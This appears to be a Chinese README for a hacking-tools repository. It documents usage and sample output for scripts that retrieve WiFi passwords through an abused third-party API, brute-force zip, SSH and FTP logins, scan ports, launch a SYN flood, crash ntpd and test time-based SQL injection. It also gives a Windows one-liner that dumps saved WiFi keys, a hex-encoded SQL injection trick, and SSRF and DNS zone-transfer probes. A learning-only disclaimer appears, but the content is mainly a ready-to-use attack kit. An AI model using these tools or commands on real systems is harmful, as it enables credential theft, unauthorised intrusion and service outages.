# Hacking Tools Demo
simple hack tools ,以下所有工具，代码不得用于非法用途，仅当做学习使用，违者一切后果自行承担！


### attackWiFi.py 一个获取wifi密码的工具
```
破解原理：
	破解wifi万能钥匙的接口协议，非抓包暴力破解，wifi万能钥匙的服务端存储了大量的wifi密码相关信息
	通过向接口提供ssid和bssid信息，获取真实的wifi密码
	这里要感谢zke1ev3n逆向了wifi万能钥匙的安卓客户端
	本脚本完善了破解程序，增加了容错机制，获得的密码在response中其实是urlencode的，本脚本也增加了decode解码
查看帮助
➜  Hacking git:(master) ✗ py attackWiFi.py -h
Usage: use:
	--ssid <wifi ssid> --bssid <wifi bssid>
	Example: python attackWiFi.py --ssid ssid --bssid bssid

Options:
  -h, --help          show this help message and exit
  --ssid=WIFI_SSID    the wifi ssid info
  --bssid=WIFI_BSSID  the wifi bssid info

第一步是要获得wifi的ssid和bssid信息，我演示的环境是Mac环境，其他环境请自行寻找下获取ssid和bssid的工具
Mac环境：
	执行：airport -s 获取所有wifi相关信息，这里部分信息进行了打码：
	Mac下默认airport -s 是不行的，因为我在执行之前建过一个软链接：
	ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
	其他操作系统获取方式可自行Google
```
![](https://github.com/LockGit/Hacking/blob/master/img/ssid.png)
```
上一步获得了ssid和bssid信息
执行获取密码：
python attackWiFi.py --ssid xxx --bssid ****
xxx 表示wifi的名称：比如wifi名叫：home
**** 表示wifi的bssid信息：比如 17:71:94:14:84:0d (随便写的)
那么获取密码就是：
python attackWiFi.py --ssid home --bssid 17:71:94:14:84:0d
成功了会显示password is: xxxxxxx
也有可能会失败，貌似服务端是有check的，操作多了，会获取失败，这个时候可以换一个网络环境测试，或者换一个wifi测试
```

### 图解https
```
网上大部分关于https的讲解各式各样，也不易于理解。于是自己总结画了个图，如有错误欢迎批评指正
```
![](https://github.com/LockGit/Hacking/blob/master/img/https.png)
```
1.[server] 生成配对的公钥和私钥，Pub,Pri
2.[server] 服务器将“Pub”传给客户端
3.[Client] 生成对称秘钥("key2"),然后用key2加密信息
4.[Client] 使用“Pub”加密“key2”。因为只有服务器知道“Pri”,所以“key2”是安全的
5.[Client] send(加密后的数据)和(加密的后的key2)给服务器
6.[Server] 用私钥“Pri”解密这个result_two，拿到“key2”
7.[Server]用“key2”解密加密后的数据result_one。数据安全的到达来了服务器。

总结:解密result_one用的key2采用对称加密,而公钥和私钥的生成则采用非对称加密,
所以一个完整的https流程应该是既包含了对称加密也包含了非对称加密.
```


### TcpPortForward.py 端口转发tool
```
使用场景:

一：
A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B服务器（假设IP为222.2.2.2）。
我们也可以访问公网的B服务器。我们的目标是访问A服务器的22端口。那么可以这样：

1. 在B服务器上运行：
./TcpPortForward.py l:10001 l:10002
表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了。

2. 在A服务器上运行：
./TcpPortForward.py c:localhost:22 c:222.2.2.2:10001
表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了。

3. 然后我们就可以这样来访问A服务器的22端口了：
ssh 222.2.2.2 -p 10002
原理很简单，这个命令执行后，B服务器的10002端口接收到的任何数据都会传给10001端口，此时，A服务器是连接了B服务器的10001端口的，
数据就会传给A服务器，最终进入A服务器的22端口。

二：
不用更多举例了，TcpPortForward.py的l与c两个参数可以进行灵活的两两组合，多台服务器之间只要搞明白数据流方向，那么就能满足很多场景的需求。

collect from phithon
```

### 获取所有连接过的wifi密码(Win平台)
```
需要管理员权限
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```
![](https://github.com/LockGit/Hacking/blob/master/img/win_wifi_cmd.png)


### zipattack.py | zak.py zip加密文件暴力破解

```
帮助说明：  python zipattack.py -h

测试：
zip test.zip *.gif -e 

进行暴力破解：
python zipattack.py -f test.zip -d password.txt


第二个脚本：zak.py 是无限穷举
python zak.py -h 
Usage: usage	 -f <zipfile> -t <type> -l <length> or -h get help

Options:
  -h, --help  show this help message and exit
  -f ZNAME    specifyzip file
  -t TNAME    specify type(num|a|A|aA|anum|numa|Anum|aAnum)
  -l LENGTH   specify length,default=8
例：
	python zak.py -f test.zip -t num -l 12
	表示以数字类型，长度最长为12的密码枚举test.zip文件
```


### createDict.py 生成一个简单的密码破解字典
```
python createDict.py 

按ctrl+c 停止生成
```

### PortScan.py 多线程端口扫描器
```
More Help: PortScan.py -h

测试:
	python PortScan.py -H www.baidu.com -p 80 443 110
	➜  py python PortScan.py -H www.baidu.com -p 80 443 110 
		[+] Scan Results for: 119.75.218.70
		Scanning port 443
		Scanning port 110
		Scanning port 80
		[+]443/tcp open
		[+] HTTP/1.1 302 Moved Temporarily
		Server: bfe/1.0.8.18
		Date: Sun, 06 Nov 2016 08:43:40 GMT
		Content-T
		[-]110/tcp closed
		[-]80/tcp closed
	Also, You can local test , The python script support domain or ip mode
	Example:
		python PortScan.py -H 127.0.0.1 -p 80
```

### sshAttack.py 多线程ssh密码暴力破解
```
测试：
	➜  py python sshAttack.py -h                                                    
		Usage: -H <target host> -u <user> -f <password list>

		Options:
		  -h, --help     show this help message and exit
		  -H TGTHOST     specify target host
		  -f PASSWDFILE  specify password file
		  -u USER        specify the user
		  -c COUNT       specify the max ssh connect count , default 5
	
	py python sshAttack.py -H 192.168.2.201 -u test -f /Users/lock/1.txt -c 20
	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断

例：
➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
		[-] Testing: 1111
		[-] Testing: 2222
		[-] Testing: 3333
		[-] Testing: 111111
		[-] Testing: 123123
		[-] Testing: 123456
		[+] Good , Key Found: 123456
```

### ftpAttack.py 多线程ftp密码暴力破解
```
测试：
➜  py python ftpAttack.py -h
	Usage: -H <target host> -f <password list>

	Options:
	  -h, --help     show this help message and exit
	  -H TGTHOST     specify target host
	  -f PASSWDFILE  specify password file,like username:password format file
	  -d DELAY       attack time delay set default 1s

➜  py python ftpAttack.py -H 127.0.0.1 -f userpass.md -d 1

	[-] 127.0.0.1 FTP Anonymous Logon Failed.
	[+] Trying: root/aaa

	[-] Could not brute force FTP credentials.

	[+] Trying: lock/mmm

	[-] Could not brute force FTP credentials.
	[+] Trying: alice/123


	[-] Could not brute force FTP credentials.

	The default test delay time is 0s , test default account is anonymous , if success, will show user name and password.
	userpass.md is username and password file,the file format like below:
		root:123
		hello:456
		alice:789
		test:12345
```

### synFlood.py 一个简单的 TCP SYN 洪水攻击 python版
```
More Detail:
python synFlood.py -h
1,用 Scapy 简单的复制一个 TCP SYN 洪水攻击，将制作一些 IP 数据包,  TCP 513 目标端口。
2,运行攻击发送 TCP SYN 数据包耗尽目标主机资源，填满它的连接队列，基本瘫 痪目标发送 TCP 重置包的能力。
3,netstat -an 大量的半链接状态 SYN_RECV

可能需要的依赖：
brew install --with-python libdnet

pip install scapy
pip install pcapy
pip install pydumbnet

执行效果:
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
....
```

### ntpDenialService.py 一个使ntp拒绝服务的poc代码
```
构造一个特殊的数据包，ntpd没有默认开启trap服务，如果trap被开启，攻击者就能通过特别构造的数据包导致空指针引、ntpd崩溃，进而导致服务器拒绝服务。
测试：
监听本地udp 1111 端口
➜  ~ nc -l -u 0 1111

执行：
➜  Hacking git:(master) ✗ python ntpDenialService.py 127.0.0.1 1111
[-] Sending payload to 127.0.0.1:1111 ...
[+] Done!

➜  ~ nc -l -u 0 1111

6nonce, laddr=[]:Hrags=32, laddr=[]:WOP2, laddr=[]:WOP

接受到这个特殊的数据包，ntpd崩溃，形成拒绝服务
```

### 分享一个SQL注入的技巧
```
审计开源框架/cms的时候可能会遇到一些有意思的注入漏洞
当以pdo的方式连接mysql，也就是说可以多语句执行的时候
然后，参考如下：

python:
import binascii
s='select * from x limit 1;'

print binascii.b2a_hex(s)
# 获得16进制数据，73656c656374202a2066726f6d2078206c696d697420313b

mysql -uroot
set @a:=0x73656c656374202a2066726f6d2078206c696d697420313b;

prepare s from @a;

execute s;

mysql root@localhost:test> execute s;
+------+----------+-------+
|   id |   is_reg |   pid |
|------+----------+-------|
|    1 |        1 |     0 |
+------+----------+-------+
1 row in set
Time: 0.002s
```

### attackSmb/win10.py 一个SMB漏洞的Poc代码
```
此漏洞主要影响Windows Server 2012/2016、Win8/8.1以及Win10系统。
攻击者可以模拟成一个SMB服务器，诱使客户端发起SMB请求来触发漏洞。
攻击者也可以通过中间人方式“毒化”SMB回应，插入恶意的SMB回复实现拒绝服务或控制受害系统。
```
![](https://github.com/LockGit/Hacking/blob/master/attackSmb/attacksmb.png)

### sqlInjetct.py 一个延时注入的验证
```
根据返回的时间差来猜测注入的结果是否正确(无视代码很烂)
帮助：
➜  Hacking git:(master) ✗ py sqlInjetct.py
-----Usage:-----

Example:
python sqlInject.py -u http://xxx.xxx.com/id=123

```

### 关于SSRF漏洞 与 DNS域传送漏洞
```
SSRF放大以后还是十分危险的，当利用SSRF刺探内网的时候，结合dict伪协议再利用ftp协议刺探某个ip是否存活.
一般情况下如果可以在极短时间内得到response那么基本可以判定该ip存活，反之不存在该ip。
这个技巧也是收集过来的，至于为什么应该是和ftp协议本身有关?
获得一幅内网蓝图SSRF是一个不错的选择。
如何判断SSRF：
1,SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的。
2,在我们本地浏览器的请求中就不应该存在图片的请求，如果抓包可以立即看到效果。

DNS域传送漏洞：
主域服务器A，备域服务器B,
A，B之间需要备份相关的域名，ip对应信息,
原则上只有B可以去同步A信息到自己的数据库中。但是由于配置错误,
导致任意客户端向主域发起请求,主域都会把相关信息返回给客户端,内部网络蓝图被轻松泄露。

dig soa xxx.com
得到ANSWER SECTION:假设为：
ns3.dnsv4.com

查看是否有域传送返回：
dig axfr xxx.com @ns3.dnsv4.com
有返回就表示漏洞存在
```

### 使用Python构造一个fastcgi协议请求内容发送给php-fpm , Nginx（IIS7）解析漏洞原理
```
查看帮助：
python fpm.py -h 

这篇文章写的不错，于是收集了过来：
https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

简述如下：
Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability）.
该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。

用户请求http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里：

{
    ...
    'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',
    'SCRIPT_NAME': '/favicon.ico/.php',
    'REQUEST_URI': '/favicon.ico/.php',
    'DOCUMENT_ROOT': '/var/www/html',
    ...
}
正常来说:
SCRIPT_FILENAME的值是一个不存在的文件/var/www/html/favicon.ico/.php，
是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。
PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，
fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，
再次判断文件是否存在，往次循环，直到文件存在。

所以，第一次fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。
显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

正确的解决方法有两种：
一，在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；
二，借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。

```

